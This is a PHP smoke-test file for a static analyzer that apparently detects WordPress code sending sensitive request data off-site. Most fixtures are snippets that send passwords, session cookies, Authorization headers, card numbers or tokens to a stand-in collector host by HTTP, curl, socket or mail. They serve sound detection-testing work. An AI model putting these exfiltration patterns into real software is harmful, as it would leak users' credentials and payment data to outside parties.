<?php
/**
 * Smoke tests for sensitive request/session data reaching outbound transports.
 *
 * Run with:
 * php tests/exfiltration-data-flow-smoke.php
 */

require dirname( __DIR__ ) . '/src/PhpDataFlowAnalyzer.php';

$tests = [
	[
		'name' => 'password reaches WordPress HTTP POST',
		'code' => <<<'CODE'
<?php
$password = $_POST['password'];
wp_remote_post( 'https://collector.example.invalid/submit', [ 'body' => [ 'password' => $password ] ] );
CODE,
		'expect' => 'dataflow_sensitive_http_exfil',
		'expect_severity' => 'high',
	],
	[
		'name' => 'normal contact form webhook is not treated as credential exfiltration',
		'code' => <<<'CODE'
<?php
wp_remote_post( 'https://crm.example.invalid/form', [
	'body' => [
		'email' => $_POST['email'],
		'message' => $_POST['message'],
	],
] );
CODE,
		'expect_none' => true,
	],
	[
		'name' => 'field name containing secret as a substring is not treated as a credential',
		'code' => <<<'CODE'
<?php
wp_remote_post( 'https://crm.example.invalid/form', [ 'body' => $_POST['secretary_name'] ] );
CODE,
		'expect_none' => true,
	],
	[
		'name' => 'session cookie reaches outbound HTTP URL',
		'code' => <<<'CODE'
<?php
$url = 'https://collector.example.invalid/pixel?sid=' . $_COOKIE['sessionid'];
wp_remote_get( $url );
CODE,
		'expect' => 'dataflow_sensitive_http_exfil',
	],
	[
		'name' => 'sensitive cookies sent to a proven local WordPress admin URL are not external exfiltration',
		'code' => <<<'CODE'
<?php
$args = [
	'body' => 'test',
	'cookies' => $_COOKIE,
];
$url = add_query_arg( [ 'action' => 'background_check' ], admin_url( 'admin-ajax.php' ) );
wp_remote_post( $url, $args );
CODE,
		'expect_none' => true,
	],
	[
		'name' => 'sensitive cookies sent to an external URL remain reportable',
		'code' => <<<'CODE'
<?php
$url = add_query_arg( [ 'action' => 'background_check' ], 'https://collector.example.invalid/' );
wp_remote_post( $url, [ 'cookies' => $_COOKIE ] );
CODE,
		'expect' => 'dataflow_sensitive_http_exfil',
	],
	[
		'name' => 'authorization header reaches outbound HTTP',
		'code' => <<<'CODE'
<?php
$authorization = $_SERVER['HTTP_AUTHORIZATION'];
wp_safe_remote_post( 'https://collector.example.invalid/auth', [ 'body' => $authorization ] );
CODE,
		'expect' => 'dataflow_sensitive_http_exfil',
	],
	[
		'name' => 'authorization key is refined from a generic request-header array',
		'code' => <<<'CODE'
<?php
$headers = getallheaders();
wp_remote_post( 'https://collector.example.invalid/auth', [ 'body' => $headers['Authorization'] ] );
CODE,
		'expect' => 'dataflow_sensitive_http_exfil',
	],
	[
		'name' => 'generic request headers are not automatically treated as sensitive',
		'code' => <<<'CODE'
<?php
$headers = getallheaders();
wp_remote_post( 'https://proxy.example.invalid/', [ 'body' => $headers ] );
CODE,
		'expect_none' => true,
	],
	[
		'name' => 'credential key is refined after copying a request array',
		'code' => <<<'CODE'
<?php
$payload = $_POST;
wp_remote_post( 'https://collector.example.invalid/', [ 'body' => $payload['password'] ] );
CODE,
		'expect' => 'dataflow_sensitive_http_exfil',
	],
	[
		'name' => 'payment field reaches outbound HTTP',
		'code' => <<<'CODE'
<?php
$card = $_POST['card_number'];
wp_remote_request( 'https://collector.example.invalid/pay', [ 'method' => 'POST', 'body' => $card ] );
CODE,
		'expect' => 'dataflow_sensitive_http_exfil',
	],
	[
		'name' => 'cookie reaches curl POST body',
		'code' => <<<'CODE'
<?php
$ch = curl_init( 'https://collector.example.invalid/' );
curl_setopt( $ch, CURLOPT_POSTFIELDS, json_encode( $_COOKIE ) );
curl_exec( $ch );
CODE,
		'expect' => 'dataflow_sensitive_curl_exfil',
	],
	[
		'name' => 'normal curl webhook body is not treated as credential exfiltration',
		'code' => <<<'CODE'
<?php
$ch = curl_init( 'https://hooks.example.invalid/' );
curl_setopt_array( $ch, [ CURLOPT_POSTFIELDS => $_POST['message'] ] );
curl_exec( $ch );
CODE,
		'expect_none' => true,
	],
	[
		'name' => 'password reaches mail body',
		'code' => <<<'CODE'
<?php
wp_mail( 'receiver@example.invalid', 'Credentials', $_POST['password'] );
CODE,
		'expect' => 'dataflow_sensitive_mail_exfil',
	],
	[
		'name' => 'normal contact message mail is not treated as credential exfiltration',
		'code' => <<<'CODE'
<?php
wp_mail( 'admin@example.invalid', 'Contact form', $_POST['message'] );
CODE,
		'expect_none' => true,
	],
	[
		'name' => 'authorization header reaches socket write',
		'code' => <<<'CODE'
<?php
$socket = stream_socket_client( 'tcp://collector.example.invalid:9000' );
fwrite( $socket, $_SERVER['HTTP_AUTHORIZATION'] );
CODE,
		'expect' => 'dataflow_sensitive_socket_exfil',
	],
	[
		'name' => 'sensitive value through local outbound helper',
		'code' => <<<'CODE'
<?php
function security_scan_send_value( $value ) {
	wp_remote_post( 'https://collector.example.invalid/', [ 'body' => $value ] );
}
security_scan_send_value( $_POST['client_secret'] );
CODE,
		'expect' => 'dataflow_local_function_security_scan_send_value_exfiltration',
	],
	[
		'name' => 'normal value through local outbound helper',
		'code' => <<<'CODE'
<?php
function security_scan_send_message( $value ) {
	wp_remote_post( 'https://crm.example.invalid/', [ 'body' => $value ] );
}
security_scan_send_message( $_POST['message'] );
CODE,
		'expect_none' => true,
	],
	[
		'name' => 'sensitive data in remote file URL',
		'code' => <<<'CODE'
<?php
$url = 'https://collector.example.invalid/read?token=' . $_POST['access_token'];
file_get_contents( $url );
CODE,
		'expect' => 'dataflow_sensitive_url_exfil',
	],
	[
		'name' => 'sensitive value used as local file path is not outbound',
		'code' => <<<'CODE'
<?php
file_get_contents( $_POST['password'] );
CODE,
		'expect_none' => true,
	],
	[
		'name' => 'raw request body forwarded to webhook is not automatically sensitive',
		'code' => <<<'CODE'
<?php
$body = file_get_contents( 'php://input' );
wp_remote_post( 'https://hooks.example.invalid/', [ 'body' => $body ] );
CODE,
		'expect_none' => true,
	],
];

$failures = 0;

foreach ( $tests as $test ) {
	$analyzer = new Security_Scan_Php_Data_Flow_Analyzer();
	$findings = $analyzer->analyze( $test['code'] );
	$rules = array_column( $findings, 'rule' );
	$passed = ! empty( $test['expect_none'] ) ? empty( $findings ) : in_array( $test['expect'], $rules, true );
	if ( $passed && isset( $test['expect_severity'] ) ) {
		$matched = null;
		foreach ( $findings as $finding ) {
			if ( $test['expect'] === $finding['rule'] ) {
				$matched = $finding;
				break;
			}
		}
		$passed = null !== $matched && $test['expect_severity'] === $matched['severity'];
	}

	if ( $passed ) {
		echo 'PASS  ' . $test['name'] . PHP_EOL;
		continue;
	}

	$failures++;
	echo 'FAIL  ' . $test['name'] . PHP_EOL;
	foreach ( $findings as $finding ) {
		echo '      ' . $finding['rule'] . ' — ' . $finding['description'] . PHP_EOL;
	}
}

if ( $failures > 0 ) {
	echo PHP_EOL . $failures . ' test(s) failed.' . PHP_EOL;
	exit( 1 );
}

echo PHP_EOL . 'All exfiltration data-flow smoke tests passed.' . PHP_EOL;
